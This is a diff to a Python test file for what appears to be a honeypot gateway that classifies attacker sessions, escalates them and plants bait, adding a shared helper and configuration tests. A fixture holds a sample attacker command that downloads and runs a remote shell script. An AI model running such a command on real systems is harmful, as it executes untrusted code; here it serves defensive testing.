@@ -379,12 +379,18 @@ LOW = [{"ts": "2025-07-01T00:00:00+00:00", "input": "uname -a"}, {"ts": "2025-07
 HIGH_RISK = [*LOW, {"ts": "2025-07-01T00:00:02+00:00", "input": "wget http://x/a.sh; sh a.sh"}]
 
 
-def learned_run(persona, deid, tier, commands, backend, history=()):
-    """Escalate lsblk through a learned-mode gateway whose tier model answers tier, or a tuple's majority with its share as probability."""
+def learned_gateway(persona, deid, tier, commands, backend):
+    """A learned-mode gateway on fakes whose tier model answers tier, or a tuple's majority with its share as probability."""
     tiers = list(tier) if isinstance(tier, tuple) else [tier]
     db = FakeDb(deid, commands=commands)
     gw = Gateway(GatewayConfig(token="t" * 16, canary="ref-canary"), db, backend, persona)
     gw.classifiers = {**CLASSIFIERS, "tier": {"features": list(FEATURES), "model": DummyClassifier(strategy="prior").fit([[0] * len(FEATURES)] * len(tiers), tiers)}}
+    return gw, db
+
+
+def learned_run(persona, deid, tier, commands, backend, history=()):
+    """Escalate lsblk through a learned-mode gateway whose tier model answers tier."""
+    gw, db = learned_gateway(persona, deid, tier, commands, backend)
     req = EscalationRequest(session="s1", src_ip="198.51.100.9", username="root", argv=["lsblk"], history=list(history))
     return asyncio.run(gw.escalate(req)), db
 
@@ -417,10 +423,8 @@ def test_learned_mode_declines_low_severity_bots_like_plain_cowrie(persona, deid
 
 def assess_run(persona, deid, tier, commands, backend, learned=True):
     """Assess session s1 twice through a gateway whose tier model always answers tier, in learned mode or not."""
-    db = FakeDb(deid, commands=commands)
-    gw = Gateway(GatewayConfig(token="t" * 16, canary="ref-canary"), db, backend, persona)
-    if learned:
-        gw.classifiers = {**CLASSIFIERS, "tier": {"features": list(FEATURES), "model": DummyClassifier(strategy="prior").fit([[0] * len(FEATURES)], [tier])}}
+    gw, db = learned_gateway(persona, deid, tier, commands, backend)
+    gw.classifiers = gw.classifiers if learned else None
     req = AssessRequest(session="s1", src_ip="198.51.100.9", username="root", history=[c["input"] for c in commands])
     return [asyncio.run(gw.assess(req)) for _ in range(2)], db
 
@@ -453,3 +457,23 @@ def test_assess_plants_nothing_for_bots_other_modes_unbaited_tactics_or_rejected
     (first, second), db = assess_run(persona, deid, tier, commands, backend, learned)
     assert first == second == [] and db.baits == [] and db.commits == []
     assert [r["outcome"] for r in db.logged] == logged
+
+
+@pytest.mark.parametrize("mode, escalation, classifiers", [("learned", True, "/c/m.joblib"), (" ALL ", True, None)])
+def test_config_reads_the_escalation_mode_once(monkeypatch, mode, escalation, classifiers):
+    """all and learned switch escalation on, written in any case; only learned loads the classifier file."""
+    monkeypatch.setenv("VULNMAZE_GATEWAY_TOKEN", "t" * 16)
+    monkeypatch.setenv("VULNMAZE_ESCALATION", mode)
+    monkeypatch.setenv("VULNMAZE_CLASSIFIERS", "/c/m.joblib")
+    cfg = GatewayConfig.from_env()
+    assert (cfg.escalation, cfg.classifiers) == (escalation, classifiers)
+
+
+@pytest.mark.parametrize("mode", ["off", "OFF", " off "])
+def test_config_with_escalation_off_loads_nothing(monkeypatch, mode):
+    """off, in any case and with spaces, keeps escalation off and loads no classifiers."""
+    monkeypatch.setenv("VULNMAZE_GATEWAY_TOKEN", "t" * 16)
+    monkeypatch.setenv("VULNMAZE_ESCALATION", mode)
+    monkeypatch.setenv("VULNMAZE_CLASSIFIERS", "/c/m.joblib")
+    cfg = GatewayConfig.from_env()
+    assert (cfg.escalation, cfg.classifiers) == (False, None)
